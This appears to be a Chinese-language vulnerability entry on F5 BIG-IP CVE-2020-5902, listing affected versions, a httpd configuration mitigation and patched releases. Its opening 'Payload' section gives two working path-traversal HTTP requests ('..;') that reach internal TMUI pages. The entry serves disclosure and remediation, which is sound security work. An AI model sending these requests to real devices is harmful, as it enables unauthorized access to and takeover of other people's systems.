# F5 BIG-IP 远程代码执行漏洞（CVE-2020-5902）

编辑：r4v3zn

## Payload

```
GET /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp 

GET /tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=AnyMsgHereWillBeReflectedInTheResponse
```

![](cve-2020-5902/1.png)

## 概况

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020 年7 月 1日，F5 公布流量管理用户界面（TMUI），也称为配置实用程序，在未公开的页面中具有远程执行代码（RCE）漏洞，漏洞编号为 CVE-2020-5902。

攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码，可能完全入侵系统，对此漏洞 CVSS 评分 10 分。

## 影响版本

- BIG-IP = 15.1.0
- BIG-IP = 15.0.0
- BIG-IP 14.1.0 - 14.1.2
- BIG-IP 13.1.0 - 13.1.3
- BIG-IP 12.1.0 - 12.1.5
- BIG-IP 11.6.1 - 11.6.5

## 分析过程

无

## 靶场

无

## 修复

1. 登陆 TMOS Shell（**tmsh**）执行：

`tmsh`

2. 修改 httpd 配置信息：

```
edit /sys httpd all-properties
```

3. 找到`include` 部分并添加以下内容：

```
include '
<LocationMatch ".*\.\.;.*">
Redirect 404 /
</LocationMatch>
'
```

4. 通过输入以下命令，将更改写入并保存到配置文件中：

```
Esc
:wq!
```

5. 通过输入以下命令来保存配置：

```
save /sys config
```

6. 通过输入以下命令来重新启动**httpd**服务：

```
restart sys service httpd
```

也可以通过升级的方式来进行修复：

- BIG-IP 15.x 升级至 15.1.0.4

- BIG-IP 14.x 升级至 14.1.2.6
- BIG-IP 13.x 升级至 13.1.3.4
- BIG-IP 12.x 升级至 12.1.5.2
- BIG-IP 11.x 升级至 11.6.5.2

## 分析文章



## 参考

- https://twitter.com/Nep_1337_1998/status/1279610946864820225